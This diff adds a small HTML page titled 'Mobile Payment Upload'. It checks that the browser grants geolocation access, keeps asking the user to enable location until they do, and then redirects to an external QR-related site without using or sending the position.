@@ -1,1 +1,88 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Mobile Payment Upload</title>
+<style>
+  body {
+    margin:0; padding:0;
+    font-family: system-ui, -apple-system, sans-serif;
+    background:#0b0f14;
+    color:#e6edf3;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    text-align:center;
+  }
+  .container { max-width:90%; }
+  button {
+    background:#7aa2ff;
+    color:#0b0f14;
+    border:none;
+    border-radius:8px;
+    padding:14px 22px;
+    font-weight:600;
+    cursor:pointer;
+  }
+  .message {
+    color:#95a1b2;
+    margin-top:14px;
+    font-size:15px;
+  }
+</style>
+</head>
+<body>
+  <div class="container" id="content">
+    <h2>Checking Location Access…</h2>
+    <div class="message">Please wait while we verify your location permission.</div>
+  </div>
+
+<script>
+(async () => {
+  const container = document.getElementById('content');
+
+  function showPrompt() {
+    container.innerHTML = `
+      <h2>Enable Location Access</h2>
+      <div class="message">
+        To continue, please enable location from your phone’s settings
+        and then tap the button below.
+      </div>
+      <button id="retryBtn">I've Turned On Location</button>
+    `;
+    document.getElementById('retryBtn').addEventListener('click', checkLocation);
+  }
+
+  async function checkLocation() {
+    if (!navigator.geolocation) {
+      container.innerHTML = `<h2>Location not supported</h2>
+      <div class="message">Your browser doesn’t support location access.</div>`;
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        // ✅ Location is available, redirect
+        window.location.href = "https://qr.silverspace.tech";
+      },
+      err => {
+        if (err.code === 1) {
+          // Permission denied
+          showPrompt();
+        } else {
+          // Other error (location off or unavailable)
+          showPrompt();
+        }
+      },
+      { enableHighAccuracy:true, timeout:7000 }
+    );
+  }
+
+  checkLocation();
+})();
+</script>
+</body>
+</html>
 
